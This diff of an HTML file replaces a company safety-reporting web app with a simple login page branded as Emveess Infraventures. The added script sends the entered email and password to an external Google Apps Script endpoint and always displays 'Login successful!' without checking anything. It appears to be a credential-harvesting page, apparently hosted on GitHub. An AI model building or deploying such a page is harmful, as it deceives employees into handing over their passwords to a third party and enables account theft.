@@ -1,549 +1,164 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>EMVEESS Safety Daily Management Plan</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
-  <style>
-    body { background: #f0f4f8; font-family: 'Segoe UI', system-ui, sans-serif; color: #2d3748; }
-    .card-master { border: none; border-radius: 14px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); background: #ffffff; }
-    .tata-header { background: #ffffff; border-left: 5px solid #0056b3; border-radius: 6px; padding: 15px; margin-bottom: 25px; font-size: 13px; box-shadow: 0 2px 8px rgba(0,0,0,0.03); }
-    .tata-title { font-weight: 700; color: #0056b3; font-size: 19px; text-transform: uppercase; letter-spacing: 0.5px; }
-    .section-banner { background: linear-gradient(90deg, #0056b3, #007bff); color: white; font-weight: 600; padding: 10px 15px; border-radius: 6px; margin-bottom: 20px; text-transform: uppercase; font-size: 14px; }
-    .table th { background-color: #f8fafc; color: #334155; font-weight: 600; font-size: 13px; text-transform: uppercase; }
-    .btn-step { min-width: 130px; font-weight: 600; border-radius: 6px; }
-    .form-control, .form-select { border-radius: 6px; border: 1px solid #cbd5e1; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Interface</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #4f46e5, #06b6d4);
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .login-header h2 {
+            color: #1e293b;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .login-header p {
+            color: #64748b;
+            font-size: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #334155;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4f46e5;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .login-btn:hover {
+            background-color: #4338ca;
+        }
+
+        #message {
+            margin-top: 15px;
+            text-align: center;
+            font-size: 14px;
+            display: none;
+            font-weight: 600;
+        }
+    </style>
 </head>
 <body>
 
-  <div id="login-panel" class="container py-5">
-    <div class="row justify-content-center pt-5">
-      <div class="col-md-5">
-        <div class="card card-master p-4 text-center">
-          <div class="mb-2"><i class="bi bi-shield-check text-primary" style="font-size: 3.5rem;"></i></div>
-          <h3 class="text-dark fw-bold mb-1">EMVEESS INFRAVENTURES PVT.LTD. </h3>
-          <p class="text-muted small">Daily Management Plan (DMP) Safety Management </p>
-          <hr>
-          <div id="login-error" class="alert alert-danger d-none"></div>
-          <form id="loginForm" onsubmit="executeAuth(event)">
-            <div class="form-floating mb-3">
-              <input type="text" class="form-control" id="uid" placeholder="Username" required>
-              <label>Username</label>
+    <div class="login-container">
+        <div class="login-header">
+            <h2>Emveess Infraventures Pvt. Ltd</h2>
+            <p>Please enter your details to Log in</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" placeholder="you@example.com" required>
             </div>
-            <div class="form-floating mb-4">
-              <input type="password" class="form-control" id="pwd" placeholder="Password" required>
-              <label>Password</label>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
             </div>
-            <button type="submit" id="authBtn" class="btn btn-primary w-100 py-3 fw-bold">AUTHENTICATE & ENTER</button>
-          </form>
-        </div>
-      </div>
-    </div>
-  </div>
 
-  <div id="workspace-panel" class="container-fluid d-none py-4 px-md-5">
-    
-    <div class="card card-master p-3 mb-4 bg-dark text-white d-flex flex-row justify-content-between align-items-center flex-wrap gap-3">
-      <div><i class="bi bi-person-circle text-info me-2"></i>safety Supervisor: <span id="lbl-sup" class="fw-bold text-info"></span></div>
-      <div class="d-flex align-items-center gap-3 flex-wrap">
-        <div><label class="small text-muted me-1">Execution Date:</label><input type="date" id="meta-date" class="form-control form-control-sm d-inline-block w-auto bg-light" required></div>
-        <div><label class="small text-muted me-1">Site Location:</label><input type="text" id="meta-loc" class="form-control form-control-sm d-inline-block w-auto bg-light" placeholder="e.g., Pump House" required></div>
-      </div>
-      <button type="button" class="btn btn-sm btn-outline-danger px-3 fw-bold" onclick="logoutSystem()">Logg Out</button>
+            <button type="submit" class="login-btn" id="submitBtn">Sign In</button>
+            <div id="message"></div>
+        </form>
     </div>
 
-    <div class="tata-header row align-items-center g-3 mx-0">
-      <div class="col-md-4 text-center text-md-start">
-        <span class="tata-title">Daily Management Plan</span><br>
-        <small class="text-muted fw-bold">EMVEESS INFRAVENTURES PVT. LTD.</small>
-      </div>
-      <div class="col-md-4 border-start border-end text-center text-md-start px-md-4">
-        <strong>DOC. No:</strong> EIPL/SMP-DMP-FY26-27-V-01<br>
-        <strong>Version:</strong> 1.0 | <strong>Date:</strong> 01.04.2026
-      </div>
-      <div class="col-md-4 text-center text-md-end text-primary fw-bold fs-5">TATA STEEL LTD <br><span class="fs-6 text-muted font-monospace">#WeAlsoMakeTomorrow</span></div>
-    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevents the browser from leaving your GitHub page
+            
+            const submitBtn = document.getElementById('submitBtn');
+            const messageDiv = document.getElementById('message');
+            
+            submitBtn.innerText = "Logging in...";
+            submitBtn.disabled = true;
 
-    <div class="row mb-4">
-      <div class="col-md-4">
-        <label class="form-label fw-bold text-muted small"><i class="bi bi-grid-3x3-gap-fill text-primary"></i> DIRECT JUMP TO DOCUMENT MODULE:</label>
-        <select class="form-select border-primary fw-bold" id="formSelector" onchange="jumpToLayout(this.value)">
-          <option value="0">1. Daily Work Permit Reviews Checklist</option>
-          <option value="1">2. Daily Tool Box Talk Log</option>
-          <option value="2">3. PPE Checking Matrix</option>
-          <option value="3">4. Site Walk-through & Inspections</option>
-          <option value="4">5. Equipment / Machinery Log</option>
-          <option value="5">6. Tool & Tackles Inventory Checking</option>
-          <option value="6">7. Housekeeping Assessment (1S, 2S)</option>
-          <option value="7">8. Safety Interaction Records</option>
-          <option value="8">9. Incident / Near Miss / Hazard Reporting</option>
-          <option value="9">10. Training & Competency Observations</option>
-          <option value="10">11. Administrative & Documentation Tasks</option>
-        </select>
-      </div>
-    </div>
+            const formData = new FormData(this);
 
-    <div id="pdf-alert-box" class="alert alert-info d-none border-primary p-3 mb-4 fw-bold">
-      <i class="bi bi-file-earmark-pdf-fill text-danger fs-5"></i> System Alert: 
-      <span id="pdf-message-text"></span>
-      <a id="pdf-download-link" href="#" target="_blank" class="btn btn-sm btn-danger ms-3"><i class="bi bi-cloud-arrow-down"></i> View Generated PDF</a>
-    </div>
+            // Submits data directly to your script behind the scenes
+            fetch('https://script.google.com/macros/s/AKfycbyKpFHGJlliJyzuDfYHn3eDaDyD12mfdviUQa44fpAd9JgyzQ5I2st65Rj-7XLrlqf9/exec', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' 
+            })
+            .then(() => {
+                messageDiv.style.display = "block";
+                messageDiv.style.color = "#16a34a"; // Green text
+                messageDiv.innerText = "Login successful!";
+                submitBtn.innerText = "Sign In";
+                submitBtn.disabled = false;
+                document.getElementById('loginForm').reset();
+            })
+            .catch(error => {
+                messageDiv.style.display = "block";
+                messageDiv.style.color = "#dc2626"; // Red text
+                messageDiv.innerText = "Something went wrong. Try again.";
+                submitBtn.innerText = "Sign In";
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
 
-    <div class="card card-master p-4 mb-4">
-      <form id="consolidatedMegaForm" onsubmit="event.preventDefault();">
-        
-        <div class="layout-step" id="step-0">
-          <div class="section-banner">1. Daily Work Permit Reviews System Checklist</div>
-          <div class="row g-3 mb-3">
-            <div class="col-md-4"><label class="form-label fw-semibold">Permit No.</label><input type="text" class="form-control" name="p_no"></div>
-            <div class="col-md-4"><label class="form-label fw-semibold">Permit Taken By</label><input type="text" class="form-control" name="p_taken"></div>
-            <div class="col-md-4"><label class="form-label fw-semibold">Permit Review By</label><input type="text" class="form-control" name="p_review"></div>
-          </div>
-          <div class="table-responsive">
-            <table class="table table-bordered align-middle">
-              <thead><tr><th style="width:70px;">Sr.</th><th>Verification Point</th><th class="text-center" style="width:100px;">Yes (Y)</th><th class="text-center" style="width:100px;">No (N)</th><th>Remarks</th></tr></thead>
-              <tbody>
-                <tr><td>1</td><td>Scope of work correctly defined</td><td class="text-center"><input type="radio" name="p_v1" value="Y"></td><td class="text-center"><input type="radio" name="p_v1" value="N"></td><td><input type="text" class="form-control form-control-sm" name="p_r1"></td></tr>
-                <tr><td>2</td><td>All hazards identified</td><td class="text-center"><input type="radio" name="p_v2" value="Y"></td><td class="text-center"><input type="radio" name="p_v2" value="N"></td><td><input type="text" class="form-control form-control-sm" name="p_r2"></td></tr>
-                <tr><td>3</td><td>Control measures implemented</td><td class="text-center"><input type="radio" name="p_v3" value="Y"></td><td class="text-center"><input type="radio" name="p_v3" value="N"></td><td><input type="text" class="form-control form-control-sm" name="p_r3"></td></tr>
-                <tr><td>4</td><td>Personnel inducted & aware</td><td class="text-center"><input type="radio" name="p_v4" value="Y"></td><td class="text-center"><input type="radio" name="p_v4" value="N"></td><td><input type="text" class="form-control form-control-sm" name="p_r4"></td></tr>
-                <tr><td>5</td><td>All required signatures completed</td><td class="text-center"><input type="radio" name="p_v5" value="Y"></td><td class="text-center"><input type="radio" name="p_v5" value="N"></td><td><input type="text" class="form-control form-control-sm" name="p_r5"></td></tr>
-              </tbody>
-            </table>
-          </div>
-          <div class="mb-3"><label class="form-label fw-bold">Observations / Discrepancies</label><textarea class="form-control" name="p_observations" rows="2"></textarea></div>
-          <div class="mb-3"><label class="form-label fw-bold">Immediate Actions Taken</label><textarea class="form-control" name="p_actions" rows="2"></textarea></div>
-        </div>
-
-        <div class="layout-step d-none" id="step-1">
-          <div class="section-banner">2. Daily Tool Box Talk</div>
-          <div class="mb-3"><label class="form-label fw-bold">1. Attendees [Number / List of persons present]</label><input type="text" class="form-control" name="tbt_attendees"></div>
-          <div class="mb-3"><label class="form-label fw-bold">2. Topics Discussed</label><textarea class="form-control" name="tbt_topics" rows="2"></textarea></div>
-          <div class="mb-3"><label class="form-label fw-bold">3. Review of previous day's incidents/near misses</label><input type="text" class="form-control" name="tbt_prev_incidents"></div>
-          <div class="mb-3"><label class="form-label fw-bold">4. Today's critical tasks and associated hazards</label><textarea class="form-control" name="tbt_critical_tasks" rows="2"></textarea></div>
-          <div class="mb-3"><label class="form-label fw-bold">5. Specific safety procedures for new tasks or equipment</label><input type="text" class="form-control" name="tbt_specific_proc"></div>
-          <div class="mb-3"><label class="form-label fw-bold">6. Focus on one specific safety theme</label><input type="text" class="form-control" name="tbt_theme"></div>
-          <div class="mb-3"><label class="form-label fw-bold">7. Reminders on PPE usage and equipment checks</label><input type="text" class="form-control" name="tbt_reminders"></div>
-          <div class="mb-3"><label class="form-label fw-bold">8. Open forum for worker concerns/questions</label><input type="text" class="form-control" name="tbt_forum"></div>
-          <div class="mb-3"><label class="form-label fw-bold">9. Key Takeaways / Actions</label><input type="text" class="form-control" name="tbt_takeaways"></div>
-          <div class="mb-3"><label class="form-label fw-bold text-primary">TOOL BOX TALK CONDUCTED BY-</label><input type="text" class="form-control" name="tbt_conducted_by"></div>
-        </div>
-
-        <div class="layout-step d-none" id="step-2">
-          <div class="section-banner">3. PPE Checking Matrix</div>
-          <p class="small text-secondary mb-3"><i class="bi bi-info-circle-fill"></i> Standard Coding: (√) = Good | (X) = Damaged | (N.A) = Not Applicable</p>
-          <div class="table-responsive">
-            <table class="table table-bordered text-center align-middle" id="ppeTable">
-              <thead><tr><th>SL</th><th>EMP. NAME</th><th>DESIG.</th><th>SH</th><th>SG</th><th>SJ</th><th>SS</th><th>SG2</th><th>NM</th><th>GA</th><th>SF</th><th>REMARKS</th><th>ACTION</th></tr></thead>
-              <tbody>
-                <tr class="ppe-row">
-                  <td class="sl-num">1</td>
-                  <td><input type="text" class="form-control form-control-sm row-emp-name"></td>
-                  <td><input type="text" class="form-control form-control-sm row-emp-desig"></td>
-                  <td><select class="form-select form-select-sm row-sh"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-sg"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-sj"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-ss"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-sg2"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-nm"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-ga"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><select class="form-select form-select-sm row-sf"><option>√</option><option>X</option><option>N.A</option></select></td>
-                  <td><input type="text" class="form-control form-control-sm row-rem"></td>
-                  <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>
-                </tr>
-              </tbody>
-            </table>
-          </div>
-          <button type="button" class="btn btn-sm btn-primary mt-2" onclick="addPpeRow()"><i class="bi bi-plus-circle"></i> Add Employee Row</button>
-        </div>
-
-        <div class="layout-step d-none" id="step-3">
-          <div class="section-banner">4. Site Walk-through & Inspections (Severity 3,4,5)</div>
-          <div class="table-responsive mb-3">
-            <table class="table table-bordered align-middle" id="siteInspectionTable">
-              <thead><tr><th>Time</th><th>Location</th><th>Type (Safe/Unsafe)</th><th>Description</th><th>Photos (Y/N)</th><th>Action</th></tr></thead>
-              <tbody>
-                <tr class="site-row">
-                  <td><input type="time" class="form-control row-site-time"></td>
-                  <td><input type="text" class="form-control row-site-loc"></td>
-                  <td><select class="form-select row-site-type"><option>Safe</option><option>Unsafe Act</option><option>Unsafe Condition</option></select></td>
-                  <td><input type="text" class="form-control row-site-desc"></td>
-                  <td><select class="form-select row-site-photos"><option>N</option><option>Y</option></select></td>
-                  <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>
-                </tr>
-              </tbody>
-            </table>
-          </div>
-          <button type="button" class="btn btn-sm btn-primary mb-3" onclick="addSiteRow()"><i class="bi bi-plus-circle"></i> Add Inspection Observation</button>
-          
-          <div class="mb-3"><label class="form-label fw-bold">Immediate Actions Taken</label><input type="text" class="form-control" name="site_immediate_action"></div>
-          <h6 class="fw-bold mt-4 text-secondary">Follow-up Required (Responsibility & Target Date)</h6>
-          <table class="table table-bordered">
-            <thead><tr><th>Issue Element</th><th>Responsible Person</th><th>Target Completion Date</th></tr></thead>
-            <tbody>
-              <tr>
-                <td><input type="text" class="form-control" name="follow_issue"></td>
-                <td><input type="text" class="form-control" name="follow_resp"></td>
-                <td><input type="date" class="form-control" name="follow_target"></td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="layout-step d-none" id="step-4">
-          <div class="section-banner">5. Equipment/Machinery/Tools & Tackles (High Risk Focus)</div>
-          <table class="table table-bordered align-middle" id="eqTable">
-            <thead><tr><th>Equip. / Vehicle</th><th>Check Type</th><th>Key Safety Devices Checked</th><th>Status</th><th>Actions Taken / Remarks</th><th>Action</th></tr></thead>
-            <tbody>
-              <tr class="eq-row">
-                <td><input type="text" class="form-control row-eq-veh"></td>
-                <td><input type="text" class="form-control row-eq-chk"></td>
-                <td><input type="text" class="form-control row-eq-dev"></td>
-                <td><select class="form-select row-eq-stat"><option>OK</option><option>Deficiency</option></select></td>
-                <td><input type="text" class="form-control row-eq-rem"></td>
-                <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>
-              </tr>
-            </tbody>
-          </table>
-          <button type="button" class="btn btn-sm btn-primary mt-2" onclick="addEqRow()"><i class="bi bi-plus-circle"></i> Add Equipment Asset</button>
-        </div>
-
-        <div class="layout-step d-none" id="step-5">
-          <div class="section-banner">6. Tool & Tackles Checking</div>
-          <table class="table table-bordered align-middle" id="toolTable">
-            <thead><tr><th>Tool Name</th><th>No of Tools</th><th>Status / Condition</th><th>User Dept.</th><th>Location</th><th>Remarks</th><th>Action</th></tr></thead>
-            <tbody>
-              <tr class="tool-row">
-                <td><input type="text" class="form-control row-tool-name"></td>
-                <td><input type="number" class="form-control row-tool-qty"></td>
-                <td><input type="text" class="form-control row-tool-cond"></td>
-                <td><input type="text" class="form-control row-tool-dept"></td>
-                <td><input type="text" class="form-control row-tool-loc"></td>
-                <td><input type="text" class="form-control row-tool-rem"></td>
-                <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>
-              </tr>
-            </tbody>
-          </table>
-          <button type="button" class="btn btn-sm btn-primary mt-2" onclick="addToolRow()"><i class="bi bi-plus-circle"></i> Add Tool Entry</button>
-        </div>
-
-        <div class="layout-step d-none" id="step-6">
-          <div class="section-banner">7. Housekeeping Checking (1S, 2S Standards)</div>
-          <table class="table table-bordered align-middle">
-            <thead><tr><th style="width:70px;">Sl No.</th><th>Check Point Criteria</th><th class="text-center" style="width:120px;">Yes (√)</th><th class="text-center" style="width:120px;">No (X)</th></tr></thead>
-            <tbody>
-              <tr class="table-light"><td colspan="4" class="fw-bold text-primary">1S - SEIRI (SORT OUT)</td></tr>
-              <tr><td>1</td><td>No Unwanted things lying on M/c, table, workplace, self-etc.</td><td class="text-center"><input type="radio" name="hk_c1" value="√"></td><td class="text-center"><input type="radio" name="hk_c1" value="X"></td></tr>
-              <tr><td>2</td><td>Things are not kept which are not in use.</td><td class="text-center"><input type="radio" name="hk_c2" value="√"></td><td class="text-center"><input type="radio" name="hk_c2" value="X"></td></tr>
-              <tr><td>3</td><td>No spare component, tools, files, papers etc. are lying unnecessarily.</td><td class="text-center"><input type="radio" name="hk_c3" value="√"></td><td class="text-center"><input type="radio" name="hk_c3" value="X"></td></tr>
-              <tr><td>4</td><td>Things which cannot be used are removed.</td><td class="text-center"><input type="radio" name="hk_c4" value="√"></td><td class="text-center"><input type="radio" name="hk_c4" value="X"></td></tr>
-              <tr class="table-light"><td colspan="4" class="fw-bold text-primary">2S - SEITON (SET IN ORDER)</td></tr>
-              <tr><td>5</td><td>Specified place for keeping components, tools and files.</td><td class="text-center"><input type="radio" name="hk_c5" value="√"></td><td class="text-center"><input type="radio" name="hk_c5" value="X"></td></tr>
-              <tr><td>6</td><td>Everyone is keeping things at decided place.</td><td class="text-center"><input type="radio" name="hk_c6" value="√"></td><td class="text-center"><input type="radio" name="hk_c6" value="X"></td></tr>
-              <tr><td>7</td><td>Arrangement of rest room is good.</td><td class="text-center"><input type="radio" name="hk_c7" value="√"></td><td class="text-center"><input type="radio" name="hk_c7" value="X"></td></tr>
-              <tr><td>8</td><td>The identification system of the entire above is good.</td><td class="text-center"><input type="radio" name="hk_c8" value="√"></td><td class="text-center"><input type="radio" name="hk_c8" value="X"></td></tr>
-            </tbody>
-          </table>
-          <div class="mb-3 mt-3"><label class="form-label fw-bold">Observation Details</label><input type="text" class="form-control" name="hk_observations"></div>
-          <div class="mb-3"><label class="form-label fw-bold">Action Taken</label><input type="text" class="form-control" name="hk_actions_taken"></div>
-        </div>
-
-        <div class="layout-step d-none" id="step-7">
-          <div class="section-banner">8. Safety Interaction</div>
-          <table class="table table-bordered">
-            <thead><tr><th>Name of Interaction</th><th>Discussion Point</th><th>No of Employee Covered</th><th>Feedback Received (Y/N)</th></tr></thead>
-            <tbody>
-              <tr>
-                <td><input type="text" class="form-control" name="si_name"></td>
-                <td><input type="text" class="form-control" name="si_point"></td>
-                <td><input type="number" class="form-control" name="si_emp_count"></td>
-                <td><select class="form-select" name="si_feedback"><option>Y</option><option>N</option></select></td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="layout-step d-none" id="step-8">
-          <div class="section-banner">9. Incident/Near Miss/Hazard Reporting</div>
-          <table class="table table-bordered">
-            <thead><tr><th>Incident / Near Miss / Hazard (NOS)</th><th>Brief Description</th><th>Immediate Actions</th><th>Investigation Initiated (Y/N)</th></tr></thead>
-            <tbody>
-              <tr>
-                <td><select class="form-select" name="hz_type"><option>Hazard</option><option>Near Miss</option><option>Incident</option></select></td>
-                <td><input type="text" class="form-control" name="hz_desc"></td>
-                <td><input type="text" class="form-control" name="hz_actions"></td>
-                <td><select class="form-select" name="hz_investigation"><option>Y</option><option>N</option></select></td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="layout-step d-none" id="step-9">
-          <div class="section-banner">10. Training & Competency Observation</div>
-          <table class="table table-bordered">
-            <thead><tr><th>Observation Metrics</th><th>Action Taken Details</th><th>Training Needs Identified</th></tr></thead>
-            <tbody>
-              <tr>
-                <td><textarea class="form-control" name="train_obs" rows="2"></textarea></td>
-                <td><textarea class="form-control" name="train_action" rows="2"></textarea></td>
-                <td><input type="text" class="form-control" name="train_needs"></td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="layout-step d-none" id="step-10">
-          <div class="section-banner">11. Administrative & Documentation Tasks</div>
-          <table class="table table-bordered align-middle">
-            <thead><tr><th>SOP / JHA NO.</th><th>Compliance Status</th><th>SOP Adequacy</th><th>Action By</th><th>Actions Taken / Remarks</th></tr></thead>
-            <tbody>
-              <tr>
-                <td><input type="text" class="form-control" name="doc_sop_no"></td>
-                <td><input type="text" class="form-control" name="doc_compliance"></td>
-                <td><select class="form-select" name="doc_adequacy"><option>Adequate</option><option>Inadequate</option></select></td>
-                <td><input type="text" class="form-control" name="doc_action_by"></td>
-                <td><input type="text" class="form-control" name="doc_remarks"></td>
-              </tr>
-            </tbody>
-          </table>
-          <div class="alert alert-success border-0 text-center fw-bold mt-4 shadow-sm">🎉 ALL SYSTEM WORKSPACES READY. PROCEED TO SUBMIT REPORT.</div>
-        </div>
-
-        <hr class="mt-4">
-        <div class="d-flex justify-content-between align-items-center flex-wrap gap-2">
-          <button type="button" class="btn btn-secondary btn-step py-2 shadow-sm" id="prevBtn" onclick="navigateStep(-1)" disabled>← Back</button>
-          <div class="text-muted small fw-bold">Step Dashboard Element: <span id="stepIndicator">1</span> of 11</div>
-          <button type="button" class="btn btn-primary btn-step py-2 shadow-sm" id="nextBtn" onclick="navigateStep(1)">Save & Continue →</button>
-          <button type="button" class="btn btn-success btn-step py-2 d-none shadow-sm fw-bold" id="submitBtn" onclick="submitConsolidatedData()">CONSOLIDATE & TRANSMIT</button>
-        </div>
-      </form>
-    </div>
-  </div>
-
-  <script>
-    let activeStep = 0;
-    const totalSteps = 11;
-    let supervisorIdentityName = "";
-
-    // Add Row Functions
-    function addPpeRow() {
-      const table = document.getElementById('ppeTable').getElementsByTagName('tbody')[0];
-      const rowCount = table.rows.length;
-      const row = table.insertRow(rowCount);
-      row.className = "ppe-row";
-      row.innerHTML = `
-        <td class="sl-num">${rowCount + 1}</td>
-        <td><input type="text" class="form-control form-control-sm row-emp-name"></td>
-        <td><input type="text" class="form-control form-control-sm row-emp-desig"></td>
-        <td><select class="form-select form-select-sm row-sh"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-sg"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-sj"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-ss"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-sg2"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-nm"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-ga"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><select class="form-select form-select-sm row-sf"><option>√</option><option>X</option><option>N.A</option></select></td>
-        <td><input type="text" class="form-control form-control-sm row-rem"></td>
-        <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>`;
-    }
-
-    function addSiteRow() {
-      const tbody = document.getElementById('siteInspectionTable').getElementsByTagName('tbody')[0];
-      const row = tbody.insertRow(tbody.rows.length);
-      row.className = "site-row";
-      row.innerHTML = `
-        <td><input type="time" class="form-control row-site-time"></td>
-        <td><input type="text" class="form-control row-site-loc"></td>
-        <td><select class="form-select row-site-type"><option>Safe</option><option>Unsafe Act</option><option>Unsafe Condition</option></select></td>
-        <td><input type="text" class="form-control row-site-desc"></td>
-        <td><select class="form-select row-site-photos"><option>N</option><option>Y</option></select></td>
-        <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>`;
-    }
-
-    // Delete Row Control
-    function removeRow(btn) {
-      const row = btn.closest('tr');
-      const tbody = row.parentNode;
-      row.remove();
-      
-      // Recalculate SL numbers for PPE table if needed
-      let index = 1;
-      tbody.querySelectorAll('.sl-num').forEach(td => {
-        td.innerText = index++;
-      });
-    }
-
-    function addEqRow() {
-      const tbody = document.getElementById('eqTable').getElementsByTagName('tbody')[0];
-      const row = tbody.insertRow(tbody.rows.length);
-      row.className = "eq-row";
-      row.innerHTML = `
-        <td><input type="text" class="form-control row-eq-veh"></td>
-        <td><input type="text" class="form-control row-eq-chk"></td>
-        <td><input type="text" class="form-control row-eq-dev"></td>
-        <td><select class="form-select row-eq-stat"><option>OK</option><option>Deficiency</option></select></td>
-        <td><input type="text" class="form-control row-eq-rem"></td>
-        <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>`;
-    }
-
-    function addToolRow() {
-      const tbody = document.getElementById('toolTable').getElementsByTagName('tbody')[0];
-      const row = tbody.insertRow(tbody.rows.length);
-      row.className = "tool-row";
-      row.innerHTML = `
-        <td><input type="text" class="form-control row-tool-name"></td>
-        <td><input type="number" class="form-control row-tool-qty"></td>
-        <td><input type="text" class="form-control row-tool-cond"></td>
-        <td><input type="text" class="form-control row-tool-dept"></td>
-        <td><input type="text" class="form-control row-tool-loc"></td>
-        <td><input type="text" class="form-control row-tool-rem"></td>
-        <td><button type="button" class="btn btn-danger btn-sm" onclick="removeRow(this)"><i class="bi bi-trash"></i></button></td>`;
-    }
-
-    function executeAuth(e) {
-      e.preventDefault();
-      const u = document.getElementById('uid').value;
-      const p = document.getElementById('pwd').value;
-      const btn = document.getElementById('authBtn');
-      btn.disabled = true; btn.innerText = "Validating Identity...";
-
-      google.script.run.withSuccessHandler(function(res) {
-        if(res && res.status === "success") {
-          supervisorIdentityName = res.name;
-          document.getElementById('lbl-sup').innerText = res.name;
-          document.getElementById('login-panel').classList.add('d-none');
-          document.getElementById('workspace-panel').classList.remove('d-none');
-        } else {
-          document.getElementById('login-error').classList.remove('d-none');
-          document.getElementById('login-error').innerText = res.message || "Invalid credentials.";
-          btn.disabled = false; btn.innerText = "AUTHENTICATE & ENTER";
-        }
-      }).checkLogin(u, p);
-    }
-
-    function jumpToLayout(index) {
-      document.getElementById(`step-${activeStep}`).classList.add('d-none');
-      activeStep = parseInt(index);
-      document.getElementById(`step-${activeStep}`).classList.remove('d-none');
-      updateUIControls();
-    }
-
-    function navigateStep(direction) {
-      document.getElementById(`step-${activeStep}`).classList.add('d-none');
-      activeStep += direction;
-      document.getElementById(`step-${activeStep}`).classList.remove('d-none');
-      document.getElementById('formSelector').value = activeStep;
-      updateUIControls();
-    }
-
-    function updateUIControls() {
-      document.getElementById('stepIndicator').innerText = activeStep + 1;
-      document.getElementById('prevBtn').disabled = (activeStep === 0);
-      if(activeStep === totalSteps - 1) {
-        document.getElementById('nextBtn').classList.add('d-none');
-        document.getElementById('submitBtn').classList.remove('d-none');
-      } else {
-        document.getElementById('nextBtn').classList.remove('d-none');
-        document.getElementById('submitBtn').classList.add('d-none');
-      }
-    }
-
-    function logoutSystem() {
-      document.getElementById('consolidatedMegaForm').reset();
-      document.getElementById('workspace-panel').classList.add('d-none');
-      document.getElementById('login-panel').classList.remove('d-none');
-      document.getElementById('pdf-alert-box').classList.add('d-none');
-      document.getElementById('authBtn').disabled = false;
-      document.getElementById('authBtn').innerText = "AUTHENTICATE & ENTER";
-      activeStep = 0; jumpToLayout(0);
-    }
-
-    function submitConsolidatedData() {
-      const fDate = document.getElementById('meta-date').value;
-      const fLoc = document.getElementById('meta-loc').value;
-      if(!fDate || !fLoc) { alert("Execution Date and Site Location are mandatory!"); return; }
-
-      const sBtn = document.getElementById('submitBtn');
-      sBtn.disabled = true; sBtn.innerText = "Saving Data & Generating PDF...";
-
